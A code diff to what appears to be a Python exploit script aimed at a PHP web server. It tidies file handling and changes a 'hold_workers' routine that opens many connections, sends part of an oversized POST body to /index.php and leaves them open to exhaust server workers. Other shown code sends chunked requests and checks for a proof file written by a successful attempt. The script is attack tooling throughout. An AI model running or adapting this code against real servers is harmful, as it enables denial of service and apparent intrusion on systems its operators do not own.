@@ -85,7 +85,10 @@ def send_chunked(host: str, port: int, path: str, body_file: str, timeout: float
     if save:
         cmd += ["--save-response", save]
     subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL)
-    return open(save, "rb").read() if save else b""
+    if save:
+        with open(save, "rb") as fh:
+            return fh.read()
+    return b""
 
 
 def send_plain(host: str, port: int, path: str, body: bytes, timeout: float = 120.0) -> bytes:
@@ -175,7 +178,7 @@ def hold_workers(host: str, port: int, workers: int):
             s = socket.create_connection((host, port), timeout=5)
             s.sendall(("POST /index.php HTTP/1.1\r\nHost: %s\r\n" % host).encode() +
                       b"Content-Type: application/x-www-form-urlencoded\r\n"
-                      b"Content-Length: 1048576\r\n\r\nx")
+                      b"Content-Length: 1048576\r\n\r\n" + b"x" * 50000)
             holders.append(s)
         except OSError as exc:
             print("      holder %d/%d failed: %r" % (i + 1, n, exc))
@@ -337,7 +340,8 @@ def _run_attempt(args, holders, profile, attempt, tmp) -> int:
         time.sleep(0.6)
         if os.path.exists(args.proof):
             try:
-                proof = open(args.proof).read().strip()
+                with open(args.proof) as fh:
+                    proof = fh.read().strip()
             except PermissionError:
                 proof = subprocess.run(["sudo", "cat", args.proof],
                                        capture_output=True, text=True).stdout.strip()
